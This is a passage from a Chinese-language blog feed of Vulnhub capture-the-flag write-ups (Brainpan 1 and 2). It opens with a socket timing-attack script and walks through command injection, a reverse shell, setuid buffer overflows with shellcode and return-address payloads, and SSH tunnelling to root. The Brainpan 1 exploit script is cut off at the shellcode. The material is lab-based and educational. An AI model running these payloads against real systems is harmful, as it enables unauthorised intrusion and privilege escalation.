    <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;192.168.2.158&#39;</span><span class="p">,</span> <span class="mi">54311</span><span class="p">))</span>
    <span class="n">data</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
    <span class="k">print</span> <span class="p">(</span><span class="n">data</span><span class="p">)</span>
    <span class="n">data</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
    <span class="k">print</span> <span class="p">(</span><span class="n">data</span><span class="p">)</span>
    <span class="n">MAX_RUN</span><span class="o">=</span><span class="mi">6</span>
    <span class="n">SendTime</span><span class="o">=</span><span class="p">{}</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">readable</span><span class="p">:</span>
        <span class="n">SendTime</span> <span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="mf">0.0</span>

    <span class="k">for</span> <span class="n">count</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">MAX_RUN</span><span class="p">):</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">readable</span><span class="p">:</span>
            <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
            <span class="n">start</span><span class="o">=</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
            <span class="n">data</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
            <span class="n">SendTime</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">start</span>
                
    <span class="n">curMin</span><span class="o">=</span><span class="mf">999.0</span>
    <span class="n">curMinChar</span><span class="o">=</span><span class="s">&#39;-&#39;</span>
    <span class="k">for</span> <span class="n">x</span><span class="p">,</span><span class="n">y</span> <span class="ow">in</span> <span class="n">SendTime</span><span class="o">.</span><span class="n">iteritems</span><span class="p">():</span>
        <span class="n">avg</span><span class="o">=</span><span class="p">(</span><span class="n">y</span><span class="o">/</span><span class="n">MAX_RUN</span><span class="p">)</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">avg</span> <span class="o">&lt;</span> <span class="n">curMin</span><span class="p">):</span>
            <span class="n">curMin</span><span class="o">=</span><span class="n">avg</span>
            <span class="n">curMinChar</span><span class="o">=</span><span class="n">x</span>
    <span class="k">print</span> <span class="n">curMinChar</span> <span class="o">+</span> <span class="s">&quot;: &quot;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">curMin</span><span class="p">)</span></code></pre></div>


<p>多跑個幾次之後，會發現每次出來的結果都是R的時間最短</p>

<pre><code>R: 0.000167489051819
R: 0.000175515810649
R: 0.000179370244344
R: 0.000188191731771
</code></pre>

<p>再來就把程式碼升級，讓猜測密碼的過程可以很帥氣地表現</p>

<p>(這篇打完之後跑去看別人的writeup，發現了<a href="https://asciinema.org/">asciinema</a>這個好物，馬上套用XD)</p>

<script type="text/javascript" src="https://asciinema.org/a/17955.js" id="asciicast-17955" async  data-size="small"></script>


<p>進去後發現總共有五個level，而level2看來需要逆向工程一下，下次開新的一篇來寫</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Brainpan 2]]></title>
    <link href="http://newdominic.github.io/blog/2015/03/07/brainpan2/"/>
    <updated>2015-03-07T00:54:43+08:00</updated>
    <id>http://newdominic.github.io/blog/2015/03/07/brainpan2</id>
    <content type="html"><![CDATA[<p><a href="https://www.vulnhub.com/entry/brainpan-1,51/">Brainpan 2</a>，依舊是<a href="https://www.vulnhub.com/">Vulnhub</a>的Vulnerable Machine，作者是<a href="https://www.vulnhub.com/author/superkojiman,43/">superkojiman</a></p>

<!--more-->


<hr />

<p>nmap掃描目標，一樣掃出9999和10000上有東西</p>

<pre><code>Starting Nmap 6.46 ( http://nmap.org ) at 2015-01-02 07:10 EST
Nmap scan report for 192.168.2.156
Host is up (0.000093s latency).
Not shown: 65533 closed ports
PORT      STATE SERVICE VERSION
9999/tcp  open  abyss?
10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
SF-Port9999-TCP:V=6.46%I=7%D=1/2%Time=54A68AD6%P=x86_64-unknown-linux-gnu%
SF:r(NULL,296,"_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\
SF:|_\|\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\
SF:x20\x20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_
SF:\|\x20\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_
SF:\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_
SF:\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x2
SF:0_\|\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x
SF:20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x
SF:20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x
SF:20\x20\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\
SF:x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|_\|\x20\x20\x20\x20\x
SF:20\x20_\|_\|_\|\x20\x20_\|\x20\x20\x20\x20_\|\n\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20_\|\n\n\[______________________\x20WELCOME\x20TO\x20BRAINPAN
SF:\x202\.0________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20LOGIN\x20AS\x20GUEST\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\n\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20&gt;&gt;\x20");
MAC Address: 00:0C:29:82:55:96 (VMware)

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 166.40 seconds
</code></pre>

<p>9999看來又是架了一個brainpan.exe在上面，連上去瞧瞧</p>

<pre><code>_|                            _|
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|
                                            _|

[______________________ WELCOME TO BRAINPAN 2.0________________________]
                             LOGIN AS GUEST

                          &gt;&gt; shitstorm
Never gonna give you up Never gonna let you down Never gonna run around and desert you
</code></pre>

<p>Brainpan升級成2.0了，而且還要求以GUEST的身分登入</p>

<p>送了在Brainpan 1找到的&#8221;shitstorm&#8221;過去，送了一句歌詞回來後就被斷線了XD</p>

<p>在繼續探究Brainpan 2.0之前，先來看一下10000 port上面是不是一樣能下載brainpan.exe</p>

<p><img class="center" src="http://newdominic.github.io/images/2015-03-08-brainpan2/exe.png"></p>

<p>brainpan.exe抓下來之後先用strings掃一下有沒有藏東西</p>

<pre><code>root@kali:~/_Sec/vulnhub/brainpan2# strings brainpan.exe
JFIF
;CREATOR: gd-jpeg v1.0 (using IJG JPEG v62), quality = 85
</code></pre>

<p>結果exe是個障眼法，實際上是一張jpg檔</p>

<p><img class="center" src="http://newdominic.github.io/images/2015-03-08-brainpan2/brainpan.jpg"></p>

<p>10000 port應該是沒甚麼好看的了，接下來繼續研究Brainpan 2.0</p>

<p>用GUEST的身分登入後，使用提供的&#8221;TELL ME MORE&#8221;指令會秀出可以使用的指令</p>

<pre><code>                          &gt;&gt; TELL ME MORE
    FILES    HELP    VIEW       CREATE
    USERS    MSG     SYSTEM     BYE
</code></pre>

<p>FILES=ls -al，VIEW=cat，CREATE可以建立一個新的檔案並且寫入內容</p>

<pre><code>                          &gt;&gt; FILES
total 36
-rwxr-xr-x 1 root   root   18424 Nov  4  2013 brainpan.exe
-rw-r--r-- 1 root   root    1109 Nov  5  2013 brainpan.txt
-rw-r--r-- 1 root   root     683 Nov  4  2013 notes.txt
-rw-r--r-- 1 anansi anansi    12 Nov  5  2013 test-1
-rwxrwxrwx 1 anansi anansi    19 Nov  5  2013 test-2
</code></pre>

<p>本來突發奇想用CREATE去改brainpan.exe，再看能不能弄當brainpan.exe，等重啟的時候就會執行寫入的程式</p>

<p>不過在用notes.txt當作實驗材料的時候就當掉重啟了，看來應該是不能去修改anansi權限以外的檔案</p>

<p>接下來試試VIEW有沒有辦法作command injection</p>

<pre><code>                          &gt;&gt; VIEW
ENTER FILE TO DOWNLOAD: test-1;id
uid=1000(anansi) gid=1000(anansi) groups=1000(anansi),50(staff)
</code></pre>

<p>Command Injection成功了，再來先回攻擊端架好listen port，試試看能不能拿到reverse shell</p>

<p><img class="center" src="http://newdominic.github.io/images/2015-03-08-brainpan2/shell.png"></p>

<p>拿到anansi的shell之後，在/home/reynard找到一個有設定root sticky bit的檔案msg_root</p>

<pre><code>ls -al /home/reynard/msg_root
-rwsr-xr-x 1 root root 8999 Nov  6  2013 /home/reynard/msg_root
</code></pre>

<p>玩弄一下msg_root會發現他會把輸入的訊息記在/tmp/msg.txt，接著來試試看有沒有Buffer overflow的漏洞</p>

<pre><code>anansi@brainpan2:~$ /home/reynard/msg_root AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAA
&lt;AAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault
anansi@brainpan2:~$ gdb -q /home/reynard/msg_root
gdb -q /home/reynard/msg_root
Reading symbols from /home/reynard/msg_root...done.
(gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAA
&lt;AAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Starting program: /home/reynard/msg_root AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
</code></pre>

<p>成功把EIP指向了0x41414141(AAAA)，接下來找一下在第幾個byte可以修改EIP</p>

<p>回到Kali Linux建立pattern</p>

<pre><code>root@kali:/var/www# /usr/share/metasploit-framework/tools/pattern_create.rb 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
</code></pre>

<p>用gdb執行並送入參數</p>

<pre><code>(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A 123
&lt;b4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A 123
Starting program: /home/reynard/msg_root Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A 123

Program received signal SIGSEGV, Segmentation fault.
0x35614134 in ?? ()
</code></pre>

<p>再用0x35614134找出EIP的位置</p>

<pre><code>root@kali:/var/www# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x35614134
[*] Exact match at offset 14
</code></pre>

<p>要在只有14 byte的空間塞可以pop shell的shellcode是有困難的，之前有看過<a href="http://www.tenouk.com/Bufferoverflowc/bufferoverflowvulexploitdemo32.html">用環境變數傳入shellcode</a>的作法</p>

<p>不過使用這個方法的前提是機器沒有開ASLR，先檢查一下ASLR的設定</p>

<pre><code>anansi@brainpan2:~$ cat /proc/sys/kernel/randomize_va_space
cat /proc/sys/kernel/randomize_va_space
0
</code></pre>

<p>ASLR是關閉的，再來是實作的部分。<a href="http://shell-storm.org/shellcode/files/shellcode-606.php">shellcode</a>使用在Brainpan 1用過的</p>

<pre><code>anansi@brainpan2:~$ export EGG=`python -c 'print "\x90"*100+"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"'`
anansi@brainpan2:~$ ./findeggaddr
./findeggaddr
EGG:bffffeed
anansi@brainpan2:~$ /home/reynard/msg_root `python -c 'print "A"*14+"\xed\xfe\xff\xbf"'` 123
&lt;eynard/msg_root `python -c 'print "A"*14+"\xed\xfe\xff\xbf"'` 123
bash-4.2$ id
id
uid=1000(anansi) gid=1000(anansi) euid=104(root) groups=106(root),50(staff),1000(anansi)
</code></pre>

<p>拿到root了！可是uid不是0?去/root看一下有沒有flag之類的檔案</p>

<pre><code>bash-4.2$ cat flag.txt
cat flag.txt
cat: flag.txt: Permission denied
bash-4.2$ cat whatif.txt
cat whatif.txt

       WHAT IF I TOLD YOU
              ___
            /     \
           | ______\
          (, \_/ \_/
           |   ._. |
           \   --- /
           /`-.__.'
      .---'`-.___|\___
     /                `.

       YOU ARE NOT ROOT?
</code></pre>

<p>認命去看一下/etc/passwd</p>

<pre><code>cat /etc/passwd
root:x:104:106:root:/root:/bin/bash
root :x:0:0:root:/var/root:/bin/bash
</code></pre>

<p>&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;</p>

<p>&ldquo;root &#8220;，名字後面有個空格的才是正港的root，再找看看有沒有其他有設定sticky bit的程式</p>

<pre><code>bash-4.2$ find / -perm -u=s -type f 2&gt;/dev/null
find / -perm -u=s -type f 2&gt;/dev/null
/opt/old/brainpan-1.8/brainpan-1.8.exe
bash-4.2$ ls -al /opt/old/brainpan-1.8/brainpan-1.8.exe
ls -al /opt/old/brainpan-1.8/brainpan-1.8.exe
-rwsr-xr-x 1 puck puck 17734 Nov  4  2013 /opt/old/brainpan-1.8/brainpan-1.8.exe
</code></pre>

<p>這次出現的是在/opt/brainpan/notes.txt出現過的brainpan-1.8，擁有者是puck</p>

<p>直接執行brainpan-1.8.exe，會發現只剩下VIEW的功能，繼續試試看command injection的漏洞還在不在</p>

<pre><code> &gt;&gt; VIEW
ENTER FILE TO DOWNLOAD:  hi; id
+ read 8 bytes
/bin/cat: hi: No such file or directory
uid=1000(anansi) gid=1000(anansi) euid=1001(puck) groups=1001(puck),50(staff),1000(anansi)
</code></pre>

<p>看來這個漏洞一直都存在著，也確實以puck的身分在執行brainpan-1.8.exe</p>

<p>在瀏覽的過程中，幾度因為手殘下了Ctrl+C把reverse shell給斷開</p>

<p>一怒之下先來找看看有沒有ssh可以用Orz</p>

<pre><code>cat /etc/ssh/sshd_config
Port 2222
ListenAddress 127.0.1.1
anansi@brainpan2:~$ netstat -antp
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.1.1:2222          0.0.0.0:*               LISTEN      -
</code></pre>

<p>看來ssh有架起來，不過因為不知道anansi的密碼，就必須先連回Kali，用reverse tunneling的方式從Kali接通brainpan2的ssh port</p>

<pre><code>bash-4.2$ echo "ssh-rsa AAAAB3NzaC1y.......azvZoJx root@kali" &gt;&gt; authorized_keys
bash-4.2$ ssh root@192.168.2.128 -R 23457:127.0.1.1:2222

root@kali:~/.ssh# ssh anansi@localhost -p23457
The authenticity of host '[localhost]:23457 ([::1]:23457)' can't be established.
ECDSA key fingerprint is 0a:15:1c:1c:25:b0:fe:54:8a:35:45:e5:b8:02:97:1a.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '[localhost]:23457' (ECDSA) to the list of known hosts.
Linux brainpan2 3.2.0-4-686-pae #1 SMP Debian 3.2.51-1 i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Nov  5 09:13:28 2013
anansi@brainpan2:~$ 
</code></pre>

<p>既然ssh的線路已經架起來了，puck也用相同的方式就能用ssh連上囉</p>

<pre><code>root@kali:~# ssh puck@localhost -p23457
Linux brainpan2 3.2.0-4-686-pae #1 SMP Debian 3.2.51-1 i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
puck@brainpan2:~$
</code></pre>

<p>在/home/puck的目錄下有個.backup目錄，裡面有個.bash_history，來看一下前人下過的指令</p>

<pre><code>puck@brainpan2:~/.backup$ cat .bash_history
cd /usr/local/bin
ls -l
./msg_root "comment on the latest version please"
cd /opt/brainpan/
ps aux
vi brainpan-1.8.c
cd ../archive
netstat -antp
netstat -antp | grep 9888
cd ..
ls
cd old
ls
cd brainpan-1.8
vi brainpan-1.8.c
ssh -l "root " brainpan2
vi brainpan.7
man ./brainpan.7
ls
htop
top
ls -latr
cat .bash_history
ls
mkdir .backup
mv .ssh .bash* .backup
cd .backup/
ls
clear
ls -latr
exit
</code></pre>

<p>有使用ssh登入&#8221;root &ldquo;的記錄，再下一次指令看能不能進去</p>

<pre><code>puck@brainpan2:~/.backup$ ssh -l "root " brainpan2 -p2222
The authenticity of host '[brainpan2]:2222 ([127.0.1.1]:2222)' can't be established.
ECDSA key fingerprint is 0a:15:1c:1c:25:b0:fe:54:8a:35:45:e5:b8:02:97:1a.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '[brainpan2]:2222' (ECDSA) to the list of known hosts.
root @brainpan2's password:
</code></pre>

<p>還是會跳出要求密碼的訊息。再看一下.backup的內容物，有個.ssh的目錄，而這個目錄裡面的rsa key跟/home/puck/.ssh裡面的rsa key是不一樣的，說不定拿這個去替換就可以了</p>

<pre><code>puck@brainpan2:~/.ssh$ ssh -l "root " brainpan2 -p2222
Linux brainpan2 3.2.0-4-686-pae #1 SMP Debian 3.2.51-1 i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Nov  7 11:00:06 2013
root @brainpan2:~# cat /root/flag.txt

                          !!! CONGRATULATIONS !!!

                 You've completed the Brainpan 2 challenge!
                 Or have you...?

                 Yes, you have! Pat yourself on the back. :-)

                 Questions, comments, suggestions for new VM
                 challenges? Let me know!


                 Twitter: @superkojiman
                 Email  : contact@techorganic.com
                 Web    : http://www.techorganic.com
</code></pre>

<p>flag還要再嚇人一次</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Brainpan 1]]></title>
    <link href="http://newdominic.github.io/blog/2015/03/07/brainpan/"/>
    <updated>2015-03-07T00:54:43+08:00</updated>
    <id>http://newdominic.github.io/blog/2015/03/07/brainpan</id>
    <content type="html"><![CDATA[<p>周末<a href="https://www.vulnhub.com/entry/brainpan-1,51/">Brainpan 1</a>一日遊，依舊是<a href="https://www.vulnhub.com/">Vulnhub</a>的Vulnerable Machine，作者是<a href="https://www.vulnhub.com/author/superkojiman,43/">superkojiman</a></p>

<!--more-->


<hr />

<p>nmap掃描目標，掃出9999和10000上有東西</p>

<pre><code># Nmap 6.46 scan initiated Thu Jan  1 13:22:09 2015 as: nmap -sV -p- -Pn -o nmap.out 192.168.2.155
Nmap scan report for 192.168.2.155
Host is up (0.00020s latency).
Not shown: 65533 closed ports
PORT      STATE SERVICE VERSION
9999/tcp  open  abyss?
10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
SF-Port9999-TCP:V=6.46%I=7%D=1/1%Time=54A5905C%P=x86_64-unknown-linux-gnu%
SF:r(NULL,298,"_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\
SF:|_\|\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\
SF:x20\x20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_
SF:\|\x20\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_
SF:\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_
SF:\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x2
SF:0_\|\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x
SF:20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x
SF:20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x
SF:20\x20\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\
SF:x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|_\|\x20\x20\x20\x20\x
SF:20\x20_\|_\|_\|\x20\x20_\|\x20\x20\x20\x20_\|\n\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20_\|\n\n\[________________________\x20WELCOME\x20TO\x20BRAINP
SF:AN\x20_________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ENT
SF:ER\x20THE\x20PASSWORD\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:n\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20&gt;&gt;\x20");
MAC Address: 00:0C:29:03:CB:6C (VMware)

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
# Nmap done at Thu Jan  1 13:22:50 2015 -- 1 IP address (1 host up) scanned in 40.75 seconds
</code></pre>

<p>9999看起來有很特別的內容，先連上9999試試看</p>

<pre><code>_|                            _|
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD

                          &gt;&gt;
                          ACCESS DENIED
</code></pre>

<p>是個毫無頭緒的密碼輸入欄位，隨便試了幾個方法都沒有過，先擱置</p>

<p>而在 <a href="http://192.168.2.155:10000">http://192.168.2.155:10000</a> 上面只出現一張圖片，沒有其他線索</p>

<p>用dirbuster掃一下會找到在/bin目錄下有一個brainpan.exe，猜測應該是架在9999上的程式，直接抓下來看</p>

<pre><code>root@kali:~/_Sec/vulnhub/brainpan# strings brainpan.exe
[get_reply] s = [%s]
[get_reply] copied %d bytes to buffer
shitstorm
</code></pre>

<p>&ldquo;shitstorm&#8221;，這看起來超可疑的，直接連到目標機器試試看</p>

<pre><code>_|                            _|
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD

                          &gt;&gt; shitstorm
                          ACCESS GRANTED
</code></pre>

<p>&ldquo;ACCSESS GRANTED&rdquo;!! 成功了!</p>

<p>&hellip;然後甚麼事都沒發生，再用nmap掃一次，也沒有打開新的port，看來不是這麼簡單就能突破的關卡。</p>

<p>再來用ImmunityDebugger載入brainpan.exe之後，找到shitstorm的位置</p>

<p><img class="center" src="http://newdominic.github.io/images/2015-03-07-brainpan/shitstorm.png"></p>

<p>這個函式看起來有buffer overflow的問題，而且不知道為甚麼，上面還有一個很神奇的函式，裡面直接提供了 JMP ESP</p>

<p><img class="center" src="http://newdominic.github.io/images/2015-03-07-brainpan/welcome.png"></p>

<p>接著來試看看能不能將return address改到311712F3。在ImmunityDebugger下個斷點後，執行下面這句</p>

<pre><code>python -c 'print "A"*524 + "\xf3\x12\x17\x31"' | nc -v 192.168.2.152 9999
</code></pre>

<p><img class="center" src="http://newdominic.github.io/images/2015-03-07-brainpan/EIP.png"></p>

<p>成功進來了，剩下的就是把shellcode塞到0x311712f3之後去執行</p>

<p>找個<a href="http://shell-storm.org/shellcode/files/shellcode-882.php">bind shell</a> 把exploit拼起來</p>

<pre><code>#!/usr/bin/python

trash="A"*524

ret_addr="\xf3\x12\x17\x31"

shellcode=(
